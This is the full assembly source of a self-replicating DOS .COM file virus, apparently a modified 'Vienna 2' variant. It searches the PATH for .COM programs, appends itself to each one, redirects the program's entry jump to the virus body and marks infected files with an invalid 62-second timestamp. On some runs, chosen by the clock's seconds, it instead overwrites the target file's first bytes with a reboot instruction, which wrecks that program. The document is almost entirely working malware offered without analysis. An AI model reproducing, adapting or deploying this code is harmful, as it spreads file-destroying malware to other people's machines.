

;VIENNA 2 VIRUS REBOOT                               mod  10/93      
;works on test com files
; every 5 infection gets a reboot add instead of the infection



code            segment byte public
		assume  cs:code,ds:code,es:code,ss:code
		.RADIX 16
INT21_OFF       EQU     00084H
INT21_SEG       EQU     00086H
INT24_OFF       EQU     00090H
INT24_SEG       EQU     00092H

		org     100h

main:   jmp     VN_START           
	INT     21H
	db      1eh  dup (00)
VN_START:
	PUSH    CX
	
	;MOV    DX,OFFSET BUFFER        
		DB      0BAH
DATA_OFF        DW      OFFSET BUFFER

RESTORE_HOST:
	CLD
	MOV     SI,DX
	ADD     SI,OFFSET HOST_BYTES - OFFSET BUFFER
	MOV     DI,100H
	MOV     CX,3
	REPZ    MOVSB
	
	MOV     SI,DX

	MOV     AH,30H
	INT     21H
	CMP     AL,00
	JNE     NOT_DOS_00
	JMP     DOS_00

NOT_DOS_00:
	PUSH    ES                                            ; SAVE DTA 
	MOV     AH,2FH                                        ;  ADDRESS
	INT     21H                                           ;
	MOV     [SI+ OFFSET BUFFER -  OFFSET BUFFER],BX       ;
	MOV     [SI+ OFFSET BUFFER -  OFFSET BUFFER + 2],ES   ;
	POP     ES

	MOV     DX,OFFSET NEW_DTA - OFFSET BUFFER
	ADD     DX,SI
	MOV     AH,1AH
	INT     21H

	PUSH    ES
	PUSH    SI

;SEARCH ENIVIRMENT FOR PATH =         
	MOV     ES,DS:[002CH]
	MOV     DI,0000H

LP_PATH_SRCH:        

	POP     SI
	PUSH    SI
	ADD     SI,OFFSET NAME_  - OFFSET BUFFER
	LODSB
	MOV     CX,8000H
	REPNZ   SCASB
	
	MOV     CX,4

CHK_PAth:        
	LODSB
	SCASB
	jNE     LP_PATH_SRCH
	LOOP    chk_path

	POP     SI
	POP     ES
	
	MOV    [SI + OFFSET HUHU  - OFFSET BUFFER ],DI

	MOV     DI,SI
	ADD     DI,OFFSET F_NAME - OFFSET BUFFER
	MOV     BX,SI

	ADD     SI,OFFSET F_NAME - OFFSET BUFFER
	MOV     DI,SI
	JMP     FIN_FIRST

	CMP     WORD PTR [SI + OFFSET HUHU - OFFSET BUFFER],+00
	JNE     COUNTER
	JMP     RESTORE_DTA

COUNTER:        
	PUSH    DS
	PUSH    SI
	
	MOV     DS,ES:[002CH]
	MOV     DI,SI
	
	MOV     SI,ES:[DI +0016H]
	ADD     DI,OFFSET F_NAME - OFFSET BUFFER
DONE:
	LODSB
	
	CMP     AL,3BH
	JE      JEQUAL
	
	CMP     AL,00H
	JE      JEQUAL1

	STOSB
	JMP     DONE

JEQUAL1:
	MOV     SI,0
JEQUAL:
	POP     BX
	POP     DS
L_18F:        
	MOV     [BX +16],SI
       ;MOV     [BX + OFFSET HUHU - OFFSET BUFFER],SI

	CMP     BYTE PTR [DI - 01], 05CH             ;/
	JE      FIN_FIRST
	MOV     AL,05CH                               ;/    
	STOSB

FIN_FIRST:

	MOV     [BX + OFFSET HUH1 - OFFSET BUFFER],DI
	MOV     SI,BX
	ADD     SI,OFFSET SEARCH_MASK - OFFSET BUFFER
	MOV     CX,6H
	REPZ    MOVSB

	MOV     SI,BX                           ; FIND FIRST
	MOV     AH,4EH                           ;
	MOV     DX,OFFSET F_NAME - OFFSET BUFFER
	ADD     DX,SI
	MOV     CX,3H
	INT     21H
	
	JMP     SKIP_NEXT

FIND_NEXT:
	MOV     AH,4FH                  ;FIND NEXT
	INT     21H

SKIP_NEXT:
	JNB     FF_SUCC
	JMP     L_18F

FF_SUCC:
	MOV     AX,[SI + OFFSET XXX1 - OFFSET BUFFER]
	AND     AL,1FH
	CMP     AL,1FH
	JE      FIND_NEXT

	CMP     word ptr[ SI + OFFSET XXX2 - OFFSET BUFFER],0fa00h
	ja      find_next

	CMP     word ptr[ SI + OFFSET XXX2 - OFFSET BUFFER],+0Ah
	JB      FIND_NEXT

	MOV     DI,[SI + OFFSET HUH1 - OFFSET BUFFER]
	PUSH    SI
	ADD     SI,OFFSET DTAF_N - OFFSET BUFFER

LOOP1:        
	LODSB
	STOSB
	CMP     AL,00
	JNE     LOOP1
	
	POP     SI

	MOV     AX,4300H
	MOV     DX,OFFSET F_NAME  - OFFSET BUFFER       ; GET AND SAVE FILE
	ADD     DX,SI                                   ; ATTRIBUTE
	INT     21H
	MOV     [SI + OFFSET F_ATTR - OFFSET BUFFER],CX

	MOV     AX,4301H                                ; SET FILE ATTRIBUTE
	AND     CX,0FFFEH                               ; TO R/W
	MOV     DX,OFFSET F_NAME  - OFFSET BUFFER       ;
	ADD     DX,SI                                   ;
	INT     21H                                     ;

	MOV     AX,3D02H                                ;OPEN EXISTING FILE
	MOV     DX,OFFSET F_NAME  - OFFSET BUFFER       ;
	ADD     DX,SI                                   ;
	INT     21H                                     ;
	JNB     OPEN_Y                                  ;
	JMP     ERROR_OPENING                           ; IF ERROR

OPEN_Y:
	MOV     BX,AX

	MOV     AX,5700H                                ; GET AND SAVE FILE        
	INT     21H                                     ; TIME AND DATE
	MOV     [SI + OFFSET F_TIME - OFFSET BUFFER],CX ;
	MOV     [SI + OFFSET F_DATE - OFFSET BUFFER],DX ;

	MOV     AH,2CH                                  ;GET FILE TIME
	INT     21H                                     ;
	AND     DH,07                                   ; CHECK SECONDS
	JNE     IF_SECS_OK

	MOV     AH,40H                                  ; WRITE 5 BYTES FROM
	MOV     CX,5                                    ; REBOOT TO TOP 
	MOV     DX,SI                                   ; OF FILE
	ADD     DX,OFFSET REBOOT - OFFSET BUFFER        ;
	INT     21H                                     ;
	JMP     ERROR_READING                           ;

IF_SECS_OK:        
	MOV     AH,3FH                                  ;READ FIRST 
	MOV     CX,3                                    ;THREE BYTES INTO
	MOV     DX, OFFSET HOST_BYTES - OFFSET BUFFER   ;STORAGE
	ADD     DX,SI                                   ;
	INT     21H                                     ;
	
	JB      ERROR_READING                           ; DOS ERROR

	CMP     AX,3                                    ;COULD_T READ
	JNE     ERROR_READING                           ;3 BYTES FILE TO SMALL
	
	MOV     AX,4202H                                ;PUT POINTER
	MOV     CX,0                                    ;AT START FO FILE
	MOV     DX,0                                    ;
	INT     21H                                     ;
	JB      ERROR_READING                           ;
							     
	MOV     CX,AX                                        ;MAKE OFFSET FOR
	SUB     AX,3                                         ; NEW_JUMP
	MOV     [SI+ OFFSET NEW_JUMP + 1 - OFFSET BUFFER],AX ;
	
	ADD     CX,OFFSET buffer - offset vn_start + 100h      
					; 2F9 ?????    ADD SIZE OF 
					;TO HOST SIZE

	MOV     DI,SI                              ; DI = 31C OFFSET
	SUB     DI,OFFSET buffer - offset data_off ; PUT CORRECT OFFSET
	MOV     [DI],CX                            ; IN DATA_OFF

	MOV     AH,40H                          ; WRITE 
	MOV     CX,OFFSET FINI - offset vn_start       ; NUMBER OF BYTES IN VIRUS
	MOV     DX,SI                           ;
	SUB     DX,OFFSET BUFFER - OFFSET VN_START
	INT     21H                             ;

	CMP     AX,OFFSET FINI - offset vn_start
	JNE     ERROR_READING

	MOV     AX,4200H                        ; MOVE POINTER TO TOP
	MOV     CX,0                            ;OF HOST FILE
	MOV     DX,0                            ;
	INT     21H                             ;
	JB      ERROR_READING     
	
	MOV     AH,40h                                  ; WRITE NEW JUMP TO
	MOV     CX,3                                    ;HOST
	MOV     Dx,SI                                   ;
	ADD     DX, OFFSET NEW_JUMP - OFFSET BUFFER     ; jjj
	INT     21H                                     ;

ERROR_READING:  
	MOV     DX,[SI + OFFSET F_DATE - OFFSET BUFFER] ; WRITE TIME
	MOV     CX,[SI + OFFSET F_TIME - OFFSET BUFFER] ; DATE BACK
	AND     CX,0FFE0H                                ; TO HOST
	OR      CX,001FH                                ; SECONDS = 62 
	MOV     AX,5701H                                ;
	INT     21H                                     ;

	MOV     AH,3EH                                  ;CLOSE FILE
	INT     21h                                     ;

ERROR_OPENING:
	MOV     AX,4301H                 ;RESET F_ATTR BACK TO ORGINAL                   
	MOV     CX,[SI + OFFSET F_ATTR - OFFSET BUFFER]
	MOV     DX,OFFSET F_NAME - OFFSET BUFFER
	ADD     DX,SI
	INT     21H

RESTORE_DTA:
	PUSH    DS                                              ;RESTORE DTA
	MOV     AH,1AH                                          ;TO ORGINAL
	MOV     DX,[SI + OFFSET BUFFER - OFFSET BUFFER]         ;LOCATION
	MOV     DS,[SI + OFFSET BUFFER + 2 - OFFSET BUFFER]     ;
	INT     21H                                             ;
	POP     DS                                              ;

DOS_00:
	POP     CX
	XOR     AX,AX
	XOR     BX,BX
	XOR     DX,DX
	XOR     SI,SI
	MOV     DI,100h
	PUSH    DI
	XOR     DI,DI
	RET     0FFFFH

;DATA AFTER THIS POINT
	
BUFFER          DW      0
BUF             DW      0
F_TIME          DW      0
F_DATE          DW      0
F_ATTR          DW      0
HOST_BYTES      DB      0B8H, 00H, 4CH
NEW_JUMP        DB      0E9H, 00H, 00H
SEARCH_MASK     DB      '*.COM',00H
HUHU            DW      0005H
HUH1            DW      033BH
NAME_           DB      'PATH='
F_NAME          DB      '1.COM',00H
		DB      'D.COM',00H
		DB      'T.COM',00H
		DB      4DH, 00H
		DB      2cH DUP (20h)

NEW_DTA         DB      01H, 3FH
		DB      7 DUP (3FH)
		DB      43H, 4FH, 4DH
		DB      03, 05, 00, 00
		DB      00, 00, 00, 00, 00, 20H

XXX1            DB      5AH, 51H, 0CCH, 1AH 
		
xxx2            db      23H
		DB      00H, 00H, 00H

DTAF_N          DB      '1.COM',00H
		DB      20H, 20H, 43H, 4FH, 4DH, 00H, 00H
REBOOT          DB      0EAH, 0F0H, 0FFH, 00H, 0F0H
FINI            DB      00H
			   
CODE    ENDS
	END  MAIN

